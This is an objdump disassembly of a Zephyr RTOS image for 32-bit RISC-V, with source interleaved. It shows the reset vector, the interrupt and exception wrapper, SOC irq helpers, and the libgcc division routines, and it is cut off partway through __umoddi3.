
zephyr.elf:     file format elf32-littleriscv


Disassembly of section rom_start:

80000000 <__start>:
SECTION_FUNC(vectors, __start)
#if defined(CONFIG_RISCV_GP)
	/* Initialize global pointer */
	.option push
	.option norelax
	la gp, __global_pointer$
80000000:	0000c197          	auipc	gp,0xc
80000004:	7e818193          	addi	gp,gp,2024 # 8000c7e8 <__global_pointer$>
#else
	/*
	 * Set mtvec (Machine Trap-Vector Base-Address Register)
	 * to _isr_wrapper.
	 */
	la t0, _isr_wrapper
80000008:	00000297          	auipc	t0,0x0
8000000c:	01828293          	addi	t0,t0,24 # 80000020 <_isr_wrapper>
#endif

	csrw mtvec, t0
80000010:	30529073          	csrw	mtvec,t0

	/* Jump to __reset */
	tail __reset
80000014:	a011                	j	80000018 <__reset>
	...

Disassembly of section reset:

80000018 <__reset>:
	/*
	 * jump to __initialize
	 * use call opcode in case __initialize is far away.
	 * This will be dependent on linker.ld configuration.
	 */
	call __initialize
80000018:	099000ef          	jal	ra,800008b0 <__initialize>
	...

Disassembly of section exceptions:

80000020 <_isr_wrapper>:
	csrrw sp, mscratch, sp
1:
#endif

	/* Save caller-saved registers on current thread stack. */
	addi sp, sp, -__z_arch_esf_t_SIZEOF
80000020:	715d                	addi	sp,sp,-80
	DO_CALLER_SAVED(sr)		;
80000022:	c216                	sw	t0,4(sp)
80000024:	c41a                	sw	t1,8(sp)
80000026:	c61e                	sw	t2,12(sp)
80000028:	c872                	sw	t3,16(sp)
8000002a:	ca76                	sw	t4,20(sp)
8000002c:	cc7a                	sw	t5,24(sp)
8000002e:	ce7e                	sw	t6,28(sp)
80000030:	d02a                	sw	a0,32(sp)
80000032:	d22e                	sw	a1,36(sp)
80000034:	d432                	sw	a2,40(sp)
80000036:	d636                	sw	a3,44(sp)
80000038:	d83a                	sw	a4,48(sp)
8000003a:	da3e                	sw	a5,52(sp)
8000003c:	dc42                	sw	a6,56(sp)
8000003e:	de46                	sw	a7,60(sp)
80000040:	c006                	sw	ra,0(sp)

	/* Save s0 in the esf and load it with &_current_cpu. */
	sr s0, __z_arch_esf_t_s0_OFFSET(sp)
80000042:	c4a2                	sw	s0,72(sp)
	GET_CURRENT_CPU(s0, t0)
80000044:	00009417          	auipc	s0,0x9
80000048:	4dc40413          	addi	s0,s0,1244 # 80009520 <_kernel>
	add t0, t0, tp, %tprel_add(is_user_mode)
	sb zero, %tprel_lo(is_user_mode)(t0)
#endif

	/* Save MEPC register */
	csrr t0, mepc
8000004c:	341022f3          	csrr	t0,mepc
	sr t0, __z_arch_esf_t_mepc_OFFSET(sp)
80000050:	c096                	sw	t0,64(sp)

	/* Save MSTATUS register */
	csrr t2, mstatus
80000052:	300023f3          	csrr	t2,mstatus
	sr t2, __z_arch_esf_t_mstatus_OFFSET(sp)
80000056:	c29e                	sw	t2,68(sp)
	 * SOCs (like pulpino or riscv-qemu), the MSB is never set to indicate
	 * interrupt. Hence, check for interrupt/exception via the __soc_is_irq
	 * function (that needs to be implemented by each SOC). The result is
	 * returned via register a0 (1: interrupt, 0 exception)
	 */
	jal ra, __soc_is_irq
80000058:	0f8000ef          	jal	ra,80000150 <__soc_is_irq>

	/* If a0 != 0, jump to is_interrupt */
	bnez a0, is_interrupt
8000005c:	ed15                	bnez	a0,80000098 <is_interrupt>
	/*
	 * If the exception is the result of an ECALL, check whether to
	 * perform a context-switch or an IRQ offload. Otherwise call _Fault
	 * to report the exception.
	 */
	csrr t0, mcause
8000005e:	342022f3          	csrr	t0,mcause
	li t2, SOC_MCAUSE_EXP_MASK
80000062:	800003b7          	lui	t2,0x80000
80000066:	13fd                	addi	t2,t2,-1 # 7fffffff <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80000000>
	and t0, t0, t2
80000068:	0072f2b3          	and	t0,t0,t2

	/*
	 * If mcause == SOC_MCAUSE_ECALL_EXP, handle system call from
	 * kernel thread.
	 */
	li t1, SOC_MCAUSE_ECALL_EXP
8000006c:	432d                	li	t1,11
	beq t0, t1, is_kernel_syscall
8000006e:	00628963          	beq	t0,t1,80000080 <is_kernel_syscall>
	 * Stack pointer is pointing to a z_arch_esf_t structure, pass it
	 * to _Fault (via register a0).
	 * If _Fault shall return, set return address to
	 * no_reschedule to restore stack.
	 */
	mv a0, sp
80000072:	850a                	mv	a0,sp
	la ra, no_reschedule
80000074:	00000097          	auipc	ra,0x0
80000078:	09408093          	addi	ra,ra,148 # 80000108 <z_riscv_thread_start>
	tail _Fault
8000007c:	2ba0306f          	j	80003336 <_Fault>

80000080 <is_kernel_syscall>:
	 * again upon exiting the ISR.
	 *
	 * It's safe to always increment by 4, even with compressed
	 * instructions, because the ecall instruction is always 4 bytes.
	 */
	lr t0, __z_arch_esf_t_mepc_OFFSET(sp)
80000080:	4286                	lw	t0,64(sp)
	addi t0, t0, 4
80000082:	0291                	addi	t0,t0,4
	sr t0, __z_arch_esf_t_mepc_OFFSET(sp)
80000084:	c096                	sw	t0,64(sp)
	li t1, MSTATUS_MPRV
	csrs mstatus, t1
#endif

	/* Determine what to do. Operation code is in t0. */
	lr t0, __z_arch_esf_t_t0_OFFSET(sp)
80000086:	4292                	lw	t0,4(sp)

	.if RV_ECALL_RUNTIME_EXCEPT != 0; .err; .endif
	beqz t0, do_fault
80000088:	00028463          	beqz	t0,80000090 <do_fault>
	j reschedule
skip_schedule:
#endif

	/* default fault code is K_ERR_KERNEL_OOPS */
	li a0, 3
8000008c:	450d                	li	a0,3
	j 1f
8000008e:	a011                	j	80000092 <do_fault+0x2>

80000090 <do_fault>:

do_fault:
	/* Handle RV_ECALL_RUNTIME_EXCEPT. Retrieve reason in a0, esf in A1. */
	lr a0, __z_arch_esf_t_a0_OFFSET(sp)
80000090:	5502                	lw	a0,32(sp)
1:	mv a1, sp
80000092:	858a                	mv	a1,sp
	tail z_riscv_fatal_error
80000094:	28e0306f          	j	80003322 <z_riscv_fatal_error>

80000098 <is_interrupt>:
	csrs mstatus, t1
2:
#endif

	/* Increment _current_cpu->nested */
	lw t1, ___cpu_t_nested_OFFSET(s0)
80000098:	00042303          	lw	t1,0(s0)
	addi t2, t1, 1
8000009c:	00130393          	addi	t2,t1,1
	sw t2, ___cpu_t_nested_OFFSET(s0)
800000a0:	00742023          	sw	t2,0(s0)
	bnez t1, on_irq_stack
800000a4:	00031763          	bnez	t1,800000b2 <on_irq_stack>

	/* Switch to interrupt stack */
	mv t0, sp
800000a8:	828a                	mv	t0,sp
	lr sp, ___cpu_t_irq_stack_OFFSET(s0)
800000aa:	00442103          	lw	sp,4(s0)

	/*
	 * Save thread stack pointer on interrupt stack
	 * In RISC-V, stack pointer needs to be 16-byte aligned
	 */
	addi sp, sp, -16
800000ae:	1141                	addi	sp,sp,-16
	sr t0, 0(sp)
800000b0:	c016                	sw	t0,0(sp)

800000b2 <on_irq_stack>:
#ifdef CONFIG_TRACING_ISR
	call sys_trace_isr_enter
#endif

	/* Get IRQ causing interrupt */
	csrr a0, mcause
800000b2:	34202573          	csrr	a0,mcause
	li t0, SOC_MCAUSE_EXP_MASK
800000b6:	800002b7          	lui	t0,0x80000
800000ba:	12fd                	addi	t0,t0,-1 # 7fffffff <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80000000>
	and a0, a0, t0
800000bc:	00557533          	and	a0,a0,t0

	/*
	 * Clear pending IRQ generating the interrupt at SOC level
	 * Pass IRQ number to __soc_handle_irq via register a0
	 */
	jal ra, __soc_handle_irq
800000c0:	080000ef          	jal	ra,80000140 <__soc_handle_irq>

	/*
	 * Call corresponding registered function in _sw_isr_table.
	 * (table is 2-word wide, we should shift index accordingly)
	 */
	la t0, _sw_isr_table
800000c4:	00007297          	auipc	t0,0x7
800000c8:	e5028293          	addi	t0,t0,-432 # 80006f14 <_sw_isr_table>
	slli a0, a0, (RV_REGSHIFT + 1)
800000cc:	050e                	slli	a0,a0,0x3
	add t0, t0, a0
800000ce:	92aa                	add	t0,t0,a0

	/* Load argument in a0 register */
	lr a0, 0(t0)
800000d0:	0002a503          	lw	a0,0(t0)

	/* Load ISR function address in register t1 */
	lr t1, RV_REGSIZE(t0)
800000d4:	0042a303          	lw	t1,4(t0)

	/* Call ISR function */
	jalr ra, t1, 0
800000d8:	000300e7          	jalr	t1

800000dc <irq_done>:
    call sys_trace_isr_exit
#endif

irq_done:
	/* Decrement _current_cpu->nested */
	lw t2, ___cpu_t_nested_OFFSET(s0)
800000dc:	00042383          	lw	t2,0(s0)
	addi t2, t2, -1
800000e0:	13fd                	addi	t2,t2,-1
	sw t2, ___cpu_t_nested_OFFSET(s0)
800000e2:	00742023          	sw	t2,0(s0)
	bnez t2, no_reschedule
800000e6:	02039163          	bnez	t2,80000108 <z_riscv_thread_start>

	/* nested count is back to 0: Return to thread stack */
	lr sp, 0(sp)
800000ea:	4102                	lw	sp,0(sp)

#ifdef CONFIG_STACK_SENTINEL
	call z_check_stack_sentinel
800000ec:	768040ef          	jal	ra,80004854 <z_check_stack_sentinel>

800000f0 <check_reschedule>:
#endif

check_reschedule:

	/* Get pointer to current thread on this CPU */
	lr a1, ___cpu_t_current_OFFSET(s0)
800000f0:	440c                	lw	a1,8(s0)
	/*
	 * Get next thread to schedule with z_get_next_switch_handle().
	 * We pass it a NULL as we didn't save the whole thread context yet.
	 * If no scheduling is necessary then NULL will be returned.
	 */
	addi sp, sp, -16
800000f2:	1141                	addi	sp,sp,-16
	sr a1, 0(sp)
800000f4:	c02e                	sw	a1,0(sp)
	mv a0, zero
800000f6:	00000513          	li	a0,0
	call z_get_next_switch_handle
800000fa:	0f6050ef          	jal	ra,800051f0 <z_get_next_switch_handle>
	lr a1, 0(sp)
800000fe:	4582                	lw	a1,0(sp)
	addi sp, sp, 16
80000100:	0141                	addi	sp,sp,16
	beqz a0, no_reschedule
80000102:	c119                	beqz	a0,80000108 <z_riscv_thread_start>

80000104 <reschedule>:
	/*
	 * Perform context switch:
	 * a0 = new thread
	 * a1 = old thread
	 */
	call z_riscv_switch
80000104:	01d000ef          	jal	ra,80000920 <z_riscv_switch>

80000108 <z_riscv_thread_start>:
	addi a0, sp, __z_arch_esf_t_soc_context_OFFSET
	jal ra, __soc_restore_context
#endif /* CONFIG_RISCV_SOC_CONTEXT_SAVE */

	/* Restore MEPC register */
	lr t0, __z_arch_esf_t_mepc_OFFSET(sp)
80000108:	4286                	lw	t0,64(sp)
	csrw mepc, t0
8000010a:	34129073          	csrw	mepc,t0

	/* Restore MSTATUS register */
	lr t2, __z_arch_esf_t_mstatus_OFFSET(sp)
8000010e:	4396                	lw	t2,68(sp)
	csrrw t0, mstatus, t2
80000110:	300392f3          	csrrw	t0,mstatus,t2
	csrw mscratch, t0
1:
#endif

	/* Restore s0 (it is no longer ours) */
	lr s0, __z_arch_esf_t_s0_OFFSET(sp)
80000114:	4426                	lw	s0,72(sp)

	/* Restore caller-saved registers from thread stack */
	DO_CALLER_SAVED(lr)
80000116:	4292                	lw	t0,4(sp)
80000118:	4322                	lw	t1,8(sp)
8000011a:	43b2                	lw	t2,12(sp)
8000011c:	4e42                	lw	t3,16(sp)
8000011e:	4ed2                	lw	t4,20(sp)
80000120:	4f62                	lw	t5,24(sp)
80000122:	4ff2                	lw	t6,28(sp)
80000124:	5502                	lw	a0,32(sp)
80000126:	5592                	lw	a1,36(sp)
80000128:	5622                	lw	a2,40(sp)
8000012a:	56b2                	lw	a3,44(sp)
8000012c:	5742                	lw	a4,48(sp)
8000012e:	57d2                	lw	a5,52(sp)
80000130:	5862                	lw	a6,56(sp)
80000132:	58f2                	lw	a7,60(sp)
80000134:	4082                	lw	ra,0(sp)
#ifdef CONFIG_USERSPACE
	/* retrieve saved stack pointer */
	lr sp, __z_arch_esf_t_sp_OFFSET(sp)
#else
	/* remove esf from the stack */
	addi sp, sp, __z_arch_esf_t_SIZEOF
80000136:	6161                	addi	sp,sp,80
#endif

	mret
80000138:	30200073          	mret
8000013c:	0000                	unimp
	...

80000140 <__soc_handle_irq>:
 * SOC-specific function to handle pending IRQ number generating the interrupt.
 * Exception number is given as parameter via register a0.
 */
SECTION_FUNC(exception.other, __soc_handle_irq)
	/* Clear exception number from CSR mip register */
	li t1, 1
80000140:	4305                	li	t1,1
	sll t0, t1, a0
80000142:	00a312b3          	sll	t0,t1,a0
	csrrc t1, mip, t0
80000146:	3442b373          	csrrc	t1,mip,t0

	/* Return */
	ret
8000014a:	8082                	ret
8000014c:	0000                	unimp
	...

80000150 <__soc_is_irq>:
 * return 1 (interrupt) or 0 (exception)
 *
 */
SECTION_FUNC(exception.other, __soc_is_irq)
	/* Read mcause and check if interrupt bit is set */
	csrr t0, mcause
80000150:	342022f3          	csrr	t0,mcause
	li t1, SOC_MCAUSE_IRQ_MASK
80000154:	80000337          	lui	t1,0x80000
	and t0, t0, t1
80000158:	0062f2b3          	and	t0,t0,t1

	/* If interrupt bit is not set, return with 0 */
	addi a0, x0, 0
8000015c:	4501                	li	a0,0
	beqz t0, not_interrupt
8000015e:	00028363          	beqz	t0,80000164 <not_interrupt>
	addi a0, a0, 1
80000162:	0505                	addi	a0,a0,1

80000164 <not_interrupt>:

not_interrupt:
	/* return */
	ret
80000164:	8082                	ret

Disassembly of section text:

80000168 <__udivdi3>:
80000168:	88aa                	mv	a7,a0
8000016a:	832e                	mv	t1,a1
8000016c:	8732                	mv	a4,a2
8000016e:	882a                	mv	a6,a0
80000170:	87ae                	mv	a5,a1
80000172:	20069663          	bnez	a3,8000037e <__udivdi3+0x216>
80000176:	800075b7          	lui	a1,0x80007
8000017a:	12058593          	addi	a1,a1,288 # 80007120 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007121>
8000017e:	0cc37163          	bgeu	t1,a2,80000240 <__udivdi3+0xd8>
80000182:	66c1                	lui	a3,0x10
80000184:	0ad67763          	bgeu	a2,a3,80000232 <__udivdi3+0xca>
80000188:	10063693          	sltiu	a3,a2,256
8000018c:	0016c693          	xori	a3,a3,1
80000190:	068e                	slli	a3,a3,0x3
80000192:	00d65533          	srl	a0,a2,a3
80000196:	95aa                	add	a1,a1,a0
80000198:	0005c583          	lbu	a1,0(a1)
8000019c:	02000513          	li	a0,32
800001a0:	96ae                	add	a3,a3,a1
800001a2:	40d505b3          	sub	a1,a0,a3
800001a6:	00d50b63          	beq	a0,a3,800001bc <__udivdi3+0x54>
800001aa:	00b317b3          	sll	a5,t1,a1
800001ae:	00d8d6b3          	srl	a3,a7,a3
800001b2:	00b61733          	sll	a4,a2,a1
800001b6:	8fd5                	or	a5,a5,a3
800001b8:	00b89833          	sll	a6,a7,a1
800001bc:	01075593          	srli	a1,a4,0x10
800001c0:	02b7d333          	divu	t1,a5,a1
800001c4:	01071613          	slli	a2,a4,0x10
800001c8:	8241                	srli	a2,a2,0x10
800001ca:	02b7f7b3          	remu	a5,a5,a1
800001ce:	851a                	mv	a0,t1
800001d0:	026608b3          	mul	a7,a2,t1
800001d4:	01079693          	slli	a3,a5,0x10
800001d8:	01085793          	srli	a5,a6,0x10
800001dc:	8fd5                	or	a5,a5,a3
800001de:	0117fc63          	bgeu	a5,a7,800001f6 <__udivdi3+0x8e>
800001e2:	97ba                	add	a5,a5,a4
800001e4:	fff30513          	addi	a0,t1,-1 # 7fffffff <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80000000>
800001e8:	00e7e763          	bltu	a5,a4,800001f6 <__udivdi3+0x8e>
800001ec:	0117f563          	bgeu	a5,a7,800001f6 <__udivdi3+0x8e>
800001f0:	ffe30513          	addi	a0,t1,-2
800001f4:	97ba                	add	a5,a5,a4
800001f6:	411787b3          	sub	a5,a5,a7
800001fa:	02b7d8b3          	divu	a7,a5,a1
800001fe:	0842                	slli	a6,a6,0x10
80000200:	01085813          	srli	a6,a6,0x10
80000204:	02b7f7b3          	remu	a5,a5,a1
80000208:	031606b3          	mul	a3,a2,a7
8000020c:	07c2                	slli	a5,a5,0x10
8000020e:	00f86833          	or	a6,a6,a5
80000212:	87c6                	mv	a5,a7
80000214:	00d87b63          	bgeu	a6,a3,8000022a <__udivdi3+0xc2>
80000218:	983a                	add	a6,a6,a4
8000021a:	fff88793          	addi	a5,a7,-1
8000021e:	00e86663          	bltu	a6,a4,8000022a <__udivdi3+0xc2>
80000222:	00d87463          	bgeu	a6,a3,8000022a <__udivdi3+0xc2>
80000226:	ffe88793          	addi	a5,a7,-2
8000022a:	0542                	slli	a0,a0,0x10
8000022c:	8d5d                	or	a0,a0,a5
8000022e:	4581                	li	a1,0
80000230:	8082                	ret
80000232:	01000537          	lui	a0,0x1000
80000236:	46c1                	li	a3,16
80000238:	f4a66de3          	bltu	a2,a0,80000192 <__udivdi3+0x2a>
8000023c:	46e1                	li	a3,24
8000023e:	bf91                	j	80000192 <__udivdi3+0x2a>
80000240:	4681                	li	a3,0
80000242:	ca09                	beqz	a2,80000254 <__udivdi3+0xec>
80000244:	67c1                	lui	a5,0x10
80000246:	08f67f63          	bgeu	a2,a5,800002e4 <__udivdi3+0x17c>
8000024a:	10063693          	sltiu	a3,a2,256
8000024e:	0016c693          	xori	a3,a3,1
80000252:	068e                	slli	a3,a3,0x3
80000254:	00d657b3          	srl	a5,a2,a3
80000258:	95be                	add	a1,a1,a5
8000025a:	0005c783          	lbu	a5,0(a1)
8000025e:	97b6                	add	a5,a5,a3
80000260:	02000693          	li	a3,32
80000264:	40f685b3          	sub	a1,a3,a5
80000268:	08f69563          	bne	a3,a5,800002f2 <__udivdi3+0x18a>
8000026c:	40c307b3          	sub	a5,t1,a2
80000270:	4585                	li	a1,1
80000272:	01075893          	srli	a7,a4,0x10
80000276:	0317de33          	divu	t3,a5,a7
8000027a:	01071613          	slli	a2,a4,0x10
8000027e:	8241                	srli	a2,a2,0x10
80000280:	01085693          	srli	a3,a6,0x10
80000284:	0317f7b3          	remu	a5,a5,a7
80000288:	8572                	mv	a0,t3
8000028a:	03c60333          	mul	t1,a2,t3
8000028e:	07c2                	slli	a5,a5,0x10
80000290:	8fd5                	or	a5,a5,a3
80000292:	0067fc63          	bgeu	a5,t1,800002aa <__udivdi3+0x142>
80000296:	97ba                	add	a5,a5,a4
80000298:	fffe0513          	addi	a0,t3,-1
8000029c:	00e7e763          	bltu	a5,a4,800002aa <__udivdi3+0x142>
800002a0:	0067f563          	bgeu	a5,t1,800002aa <__udivdi3+0x142>
800002a4:	ffee0513          	addi	a0,t3,-2
800002a8:	97ba                	add	a5,a5,a4
800002aa:	406787b3          	sub	a5,a5,t1
800002ae:	0317d333          	divu	t1,a5,a7
800002b2:	0842                	slli	a6,a6,0x10
800002b4:	01085813          	srli	a6,a6,0x10
800002b8:	0317f7b3          	remu	a5,a5,a7
800002bc:	026606b3          	mul	a3,a2,t1
800002c0:	07c2                	slli	a5,a5,0x10
800002c2:	00f86833          	or	a6,a6,a5
800002c6:	879a                	mv	a5,t1
800002c8:	00d87b63          	bgeu	a6,a3,800002de <__udivdi3+0x176>
800002cc:	983a                	add	a6,a6,a4
800002ce:	fff30793          	addi	a5,t1,-1
800002d2:	00e86663          	bltu	a6,a4,800002de <__udivdi3+0x176>
800002d6:	00d87463          	bgeu	a6,a3,800002de <__udivdi3+0x176>
800002da:	ffe30793          	addi	a5,t1,-2
800002de:	0542                	slli	a0,a0,0x10
800002e0:	8d5d                	or	a0,a0,a5
800002e2:	8082                	ret
800002e4:	010007b7          	lui	a5,0x1000
800002e8:	46c1                	li	a3,16
800002ea:	f6f665e3          	bltu	a2,a5,80000254 <__udivdi3+0xec>
800002ee:	46e1                	li	a3,24
800002f0:	b795                	j	80000254 <__udivdi3+0xec>
800002f2:	00b61733          	sll	a4,a2,a1
800002f6:	00f356b3          	srl	a3,t1,a5
800002fa:	01075513          	srli	a0,a4,0x10
800002fe:	00b31333          	sll	t1,t1,a1
80000302:	00f8d7b3          	srl	a5,a7,a5
80000306:	0067e7b3          	or	a5,a5,t1
8000030a:	02a6d333          	divu	t1,a3,a0
8000030e:	01071613          	slli	a2,a4,0x10
80000312:	8241                	srli	a2,a2,0x10
80000314:	00b89833          	sll	a6,a7,a1
80000318:	02a6f6b3          	remu	a3,a3,a0
8000031c:	026608b3          	mul	a7,a2,t1
80000320:	01069593          	slli	a1,a3,0x10
80000324:	0107d693          	srli	a3,a5,0x10
80000328:	8ecd                	or	a3,a3,a1
8000032a:	859a                	mv	a1,t1
8000032c:	0116fc63          	bgeu	a3,a7,80000344 <__udivdi3+0x1dc>
80000330:	96ba                	add	a3,a3,a4
80000332:	fff30593          	addi	a1,t1,-1
80000336:	00e6e763          	bltu	a3,a4,80000344 <__udivdi3+0x1dc>
8000033a:	0116f563          	bgeu	a3,a7,80000344 <__udivdi3+0x1dc>
8000033e:	ffe30593          	addi	a1,t1,-2
80000342:	96ba                	add	a3,a3,a4
80000344:	411686b3          	sub	a3,a3,a7
80000348:	02a6d8b3          	divu	a7,a3,a0
8000034c:	07c2                	slli	a5,a5,0x10
8000034e:	83c1                	srli	a5,a5,0x10
80000350:	02a6f6b3          	remu	a3,a3,a0
80000354:	03160633          	mul	a2,a2,a7
80000358:	06c2                	slli	a3,a3,0x10
8000035a:	8fd5                	or	a5,a5,a3
8000035c:	86c6                	mv	a3,a7
8000035e:	00c7fc63          	bgeu	a5,a2,80000376 <__udivdi3+0x20e>
80000362:	97ba                	add	a5,a5,a4
80000364:	fff88693          	addi	a3,a7,-1
80000368:	00e7e763          	bltu	a5,a4,80000376 <__udivdi3+0x20e>
8000036c:	00c7f563          	bgeu	a5,a2,80000376 <__udivdi3+0x20e>
80000370:	ffe88693          	addi	a3,a7,-2
80000374:	97ba                	add	a5,a5,a4
80000376:	05c2                	slli	a1,a1,0x10
80000378:	8f91                	sub	a5,a5,a2
8000037a:	8dd5                	or	a1,a1,a3
8000037c:	bddd                	j	80000272 <__udivdi3+0x10a>
8000037e:	14d5e163          	bltu	a1,a3,800004c0 <__udivdi3+0x358>
80000382:	67c1                	lui	a5,0x10
80000384:	02f6ff63          	bgeu	a3,a5,800003c2 <__udivdi3+0x25a>
80000388:	1006b713          	sltiu	a4,a3,256
8000038c:	00174713          	xori	a4,a4,1
80000390:	070e                	slli	a4,a4,0x3
80000392:	800077b7          	lui	a5,0x80007
80000396:	00e6d5b3          	srl	a1,a3,a4
8000039a:	12078793          	addi	a5,a5,288 # 80007120 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007121>
8000039e:	97ae                	add	a5,a5,a1
800003a0:	0007c783          	lbu	a5,0(a5)
800003a4:	97ba                	add	a5,a5,a4
800003a6:	02000713          	li	a4,32
800003aa:	40f705b3          	sub	a1,a4,a5
800003ae:	02f71163          	bne	a4,a5,800003d0 <__udivdi3+0x268>
800003b2:	4505                	li	a0,1
800003b4:	e666eee3          	bltu	a3,t1,80000230 <__udivdi3+0xc8>
800003b8:	00c8b533          	sltu	a0,a7,a2
800003bc:	00154513          	xori	a0,a0,1
800003c0:	8082                	ret
800003c2:	010007b7          	lui	a5,0x1000
800003c6:	4741                	li	a4,16
800003c8:	fcf6e5e3          	bltu	a3,a5,80000392 <__udivdi3+0x22a>
800003cc:	4761                	li	a4,24
800003ce:	b7d1                	j	80000392 <__udivdi3+0x22a>
800003d0:	00f65733          	srl	a4,a2,a5
800003d4:	00b696b3          	sll	a3,a3,a1
800003d8:	8ed9                	or	a3,a3,a4
800003da:	00f35733          	srl	a4,t1,a5
800003de:	00b31333          	sll	t1,t1,a1
800003e2:	00f8d7b3          	srl	a5,a7,a5
800003e6:	0067e7b3          	or	a5,a5,t1
800003ea:	0106d313          	srli	t1,a3,0x10
800003ee:	02675eb3          	divu	t4,a4,t1
800003f2:	01069813          	slli	a6,a3,0x10
800003f6:	01085813          	srli	a6,a6,0x10
800003fa:	00b61633          	sll	a2,a2,a1
800003fe:	02677733          	remu	a4,a4,t1
80000402:	03d80e33          	mul	t3,a6,t4
80000406:	01071513          	slli	a0,a4,0x10
8000040a:	0107d713          	srli	a4,a5,0x10
8000040e:	8f49                	or	a4,a4,a0
80000410:	8576                	mv	a0,t4
80000412:	01c77c63          	bgeu	a4,t3,8000042a <__udivdi3+0x2c2>
80000416:	9736                	add	a4,a4,a3
80000418:	fffe8513          	addi	a0,t4,-1
8000041c:	00d76763          	bltu	a4,a3,8000042a <__udivdi3+0x2c2>
80000420:	01c77563          	bgeu	a4,t3,8000042a <__udivdi3+0x2c2>
80000424:	ffee8513          	addi	a0,t4,-2
80000428:	9736                	add	a4,a4,a3
8000042a:	41c70733          	sub	a4,a4,t3
8000042e:	02675e33          	divu	t3,a4,t1
80000432:	07c2                	slli	a5,a5,0x10
80000434:	83c1                	srli	a5,a5,0x10
80000436:	02677733          	remu	a4,a4,t1
8000043a:	03c80833          	mul	a6,a6,t3
8000043e:	0742                	slli	a4,a4,0x10
80000440:	8fd9                	or	a5,a5,a4
80000442:	8772                	mv	a4,t3
80000444:	0107fc63          	bgeu	a5,a6,8000045c <__udivdi3+0x2f4>
80000448:	97b6                	add	a5,a5,a3
8000044a:	fffe0713          	addi	a4,t3,-1
8000044e:	00d7e763          	bltu	a5,a3,8000045c <__udivdi3+0x2f4>
80000452:	0107f563          	bgeu	a5,a6,8000045c <__udivdi3+0x2f4>
80000456:	ffee0713          	addi	a4,t3,-2
8000045a:	97b6                	add	a5,a5,a3
8000045c:	0542                	slli	a0,a0,0x10
8000045e:	6e41                	lui	t3,0x10
80000460:	8d59                	or	a0,a0,a4
80000462:	fffe0693          	addi	a3,t3,-1 # ffff <__rom_region_size+0x6fff>
80000466:	00d57733          	and	a4,a0,a3
8000046a:	410787b3          	sub	a5,a5,a6
8000046e:	8ef1                	and	a3,a3,a2
80000470:	01055813          	srli	a6,a0,0x10
80000474:	8241                	srli	a2,a2,0x10
80000476:	02d70333          	mul	t1,a4,a3
8000047a:	02d806b3          	mul	a3,a6,a3
8000047e:	02c70733          	mul	a4,a4,a2
80000482:	02c80833          	mul	a6,a6,a2
80000486:	00d70633          	add	a2,a4,a3
8000048a:	01035713          	srli	a4,t1,0x10
8000048e:	9732                	add	a4,a4,a2
80000490:	00d77363          	bgeu	a4,a3,80000496 <__udivdi3+0x32e>
80000494:	9872                	add	a6,a6,t3
80000496:	01075693          	srli	a3,a4,0x10
8000049a:	96c2                	add	a3,a3,a6
8000049c:	02d7e063          	bltu	a5,a3,800004bc <__udivdi3+0x354>
800004a0:	d8d797e3          	bne	a5,a3,8000022e <__udivdi3+0xc6>
800004a4:	67c1                	lui	a5,0x10
800004a6:	17fd                	addi	a5,a5,-1 # ffff <__rom_region_size+0x6fff>
800004a8:	8f7d                	and	a4,a4,a5
800004aa:	0742                	slli	a4,a4,0x10
800004ac:	00f37333          	and	t1,t1,a5
800004b0:	00b898b3          	sll	a7,a7,a1
800004b4:	971a                	add	a4,a4,t1
800004b6:	4581                	li	a1,0
800004b8:	d6e8fce3          	bgeu	a7,a4,80000230 <__udivdi3+0xc8>
800004bc:	157d                	addi	a0,a0,-1 # ffffff <CONFIG_SYS_CLOCK_HW_CYCLES_PER_SEC+0x67697f>
800004be:	bb85                	j	8000022e <__udivdi3+0xc6>
800004c0:	4581                	li	a1,0
800004c2:	4501                	li	a0,0
800004c4:	8082                	ret

800004c6 <__umoddi3>:
800004c6:	8832                	mv	a6,a2
800004c8:	87aa                	mv	a5,a0
800004ca:	872e                	mv	a4,a1
800004cc:	1a069363          	bnez	a3,80000672 <__umoddi3+0x1ac>
800004d0:	800078b7          	lui	a7,0x80007
800004d4:	12088893          	addi	a7,a7,288 # 80007120 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007121>
800004d8:	0ac5f663          	bgeu	a1,a2,80000584 <__umoddi3+0xbe>
800004dc:	66c1                	lui	a3,0x10
800004de:	08d67c63          	bgeu	a2,a3,80000576 <__umoddi3+0xb0>
800004e2:	10063693          	sltiu	a3,a2,256
800004e6:	0016c693          	xori	a3,a3,1
800004ea:	068e                	slli	a3,a3,0x3
800004ec:	00d65333          	srl	t1,a2,a3
800004f0:	989a                	add	a7,a7,t1
800004f2:	0008c883          	lbu	a7,0(a7)
800004f6:	02000313          	li	t1,32
800004fa:	96c6                	add	a3,a3,a7
800004fc:	40d308b3          	sub	a7,t1,a3
80000500:	00d30b63          	beq	t1,a3,80000516 <__umoddi3+0x50>
80000504:	01159733          	sll	a4,a1,a7
80000508:	00d556b3          	srl	a3,a0,a3
8000050c:	01161833          	sll	a6,a2,a7
80000510:	8f55                	or	a4,a4,a3
80000512:	011517b3          	sll	a5,a0,a7
80000516:	01085613          	srli	a2,a6,0x10
8000051a:	02c756b3          	divu	a3,a4,a2
8000051e:	01081513          	slli	a0,a6,0x10
80000522:	8141                	srli	a0,a0,0x10
80000524:	02c77733          	remu	a4,a4,a2
80000528:	02a686b3          	mul	a3,a3,a0
8000052c:	01071593          	slli	a1,a4,0x10
80000530:	0107d713          	srli	a4,a5,0x10
80000534:	8f4d                	or	a4,a4,a1
80000536:	00d77863          	bgeu	a4,a3,80000546 <__umoddi3+0x80>
8000053a:	9742                	add	a4,a4,a6
8000053c:	01076563          	bltu	a4,a6,80000546 <__umoddi3+0x80>
80000540:	00d77363          	bgeu	a4,a3,80000546 <__umoddi3+0x80>
80000544:	9742                	add	a4,a4,a6
80000546:	8f15                	sub	a4,a4,a3
80000548:	02c756b3          	divu	a3,a4,a2
8000054c:	02c77733          	remu	a4,a4,a2
80000550:	02a686b3          	mul	a3,a3,a0
80000554:	07c2                	slli	a5,a5,0x10
80000556:	0742                	slli	a4,a4,0x10
80000558:	83c1                	srli	a5,a5,0x10
8000055a:	8fd9                	or	a5,a5,a4
8000055c:	00d7f863          	bgeu	a5,a3,8000056c <__umoddi3+0xa6>
80000560:	97c2                	add	a5,a5,a6
80000562:	0107e563          	bltu	a5,a6,8000056c <__umoddi3+0xa6>
